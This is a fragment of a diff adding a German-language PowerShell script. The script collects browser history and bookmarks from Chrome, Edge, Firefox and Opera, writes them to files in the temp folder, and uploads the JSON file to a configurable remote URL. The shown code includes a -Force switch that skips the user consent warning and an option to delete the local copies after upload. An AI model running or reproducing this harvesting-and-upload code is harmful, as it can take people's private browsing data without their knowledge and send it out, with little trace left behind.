+        Write-Host "`nKeine Browser-Daten gefunden!" -ForegroundColor Yellow
+        
+        # Debug-Info
+        if ($VerbosePreference -ne 'SilentlyContinue') {
+            Write-Host "`nDebug-Information:" -ForegroundColor Magenta
+            foreach ($browser in 'chrome', 'edge', 'firefox', 'opera') {
+                $path = switch ($browser) {
+                    'chrome' { "$env:USERPROFILE\AppData\Local\Google\Chrome" }
+                    'edge' { "$env:USERPROFILE\AppData\Local\Microsoft\Edge" }
+                    'firefox' { "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox" }
+                    'opera' { "$env:USERPROFILE\AppData\Roaming\Opera Software" }
+                }
+                $exists = Test-Path $path
+                Write-Host "  $browser : $(if($exists){'gefunden'}else{'nicht gefunden'})" -ForegroundColor $(if($exists){'Green'}else{'Red'})
+            }
+        }
+        
+        return
+    }
+    
+    # Exportieren
+    $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
+    $outputDir = Join-Path $env:TEMP "BrowserData"
+    if (-not (Test-Path $outputDir)) {
+        New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
+    }
+    
+    $jsonFile = Join-Path $outputDir "browser-data-$timestamp.json"
+    $textFile = Join-Path $outputDir "browser-data-$timestamp.txt"
+    
+    # JSON Export (strukturiert)
+    $exportedFile = $allBrowserData | Export-BrowserData -OutputPath $jsonFile -Format Json
+    Write-Host "`nDaten exportiert nach: $exportedFile" -ForegroundColor Green
+    
+    # Text Export (lesbar)
+    $allBrowserData | Export-BrowserData -OutputPath $textFile -Format Text
+    Write-Host "Report erstellt: $textFile" -ForegroundColor Green
+    
+    # Zusammenfassung
+    Write-Host "`n=== Zusammenfassung ===" -ForegroundColor Cyan
+    $summary = $allBrowserData | Group-Object -Property Browser, DataType | 
+               ForEach-Object { 
+                   $parts = $_.Name -split ', '
+                   "[$($parts[0]) $($parts[1])]: $($_.Count)" 
+               }
+    
+    Write-Host ($summary -join " | ") -ForegroundColor White
+    Write-Host "Gesamt: $($allBrowserData.Count) Einträge" -ForegroundColor White
+    
+    # Upload
+    if (-not $SkipUpload) {
+        Write-Host "`n=== Upload ===" -ForegroundColor Cyan
+        $success = Invoke-FileUpload -FilePath $jsonFile -UploadUrl $UploadUrl -Force:$Force
+        
+        if ($success) {
+            Write-Host "Daten erfolgreich hochgeladen" -ForegroundColor Green
+        }
+        else {
+            Write-Host "Upload fehlgeschlagen oder abgebrochen" -ForegroundColor Yellow
+            Write-Host "Dateien bleiben in: $outputDir" -ForegroundColor Gray
+        }
+    }
+    else {
+        Write-Host "`nUpload übersprungen (Parameter -SkipUpload)" -ForegroundColor Yellow
+        Write-Host "Dateien in: $outputDir" -ForegroundColor Gray
+    }
+    
+    # Optional: Bereinigung
+    if (-not $SkipUpload -and $success) {
+        $cleanup = Read-Host "`nDateien lokal löschen? (j/n)"
+        if ($cleanup -eq 'j') {
+            Remove-Item -Path $outputDir -Recurse -Force -ErrorAction SilentlyContinue
+            Write-Host "Dateien gelöscht" -ForegroundColor Green
+        }
+    }
+    
+    Write-Host "`nVorgang abgeschlossen" -ForegroundColor Cyan
+}
+
+# Script-Start mit Fehlerbehandlung
+try {
+    # Benutzerhinweis
+    if (-not $Force) {
+        Write-Host "`nACHTUNG: Dieses Skript sammelt Browser-Verlauf und Lesezeichen." -ForegroundColor Yellow
+        Write-Host "Die Daten können vertrauliche Informationen enthalten." -ForegroundColor Yellow
+        
+        $confirm = Read-Host "Fortfahren? (j/n)"
+        if ($confirm -ne 'j') {
+            Write-Host "Abgebrochen vom Benutzer" -ForegroundColor Gray
+            exit 0
+        }
+    }
+    
+    # Hauptfunktion aufrufen
+    Main
+    
+    # Fenster offen halten
+    if ($Host.Name -match 'console') {
+        Write-Host "`nDrücke eine Taste zum Beenden..." -ForegroundColor Gray
+        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+    }
+}
+catch {
+    Write-Error "Ein unerwarteter Fehler ist aufgetreten: $($_.Exception.Message)"
+    Write-Error "Stack Trace: $($_.ScriptStackTrace)"
+    
+    # Fehlerprotokoll
+    $errorLog = Join-Path $env:TEMP "browser-data-error-$(Get-Date -Format 'yyyyMMdd-HHmmss').log"
+    $_ | Out-File -FilePath $errorLog -Encoding UTF8
+    Write-Host "Fehlerdetails wurden gespeichert in: $errorLog" -ForegroundColor Red
+    
+    if ($Host.Name -match 'console') {
+        Write-Host "Drücke eine Taste zum Beenden..." -ForegroundColor Gray
+        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+    }
+    exit 1
+}
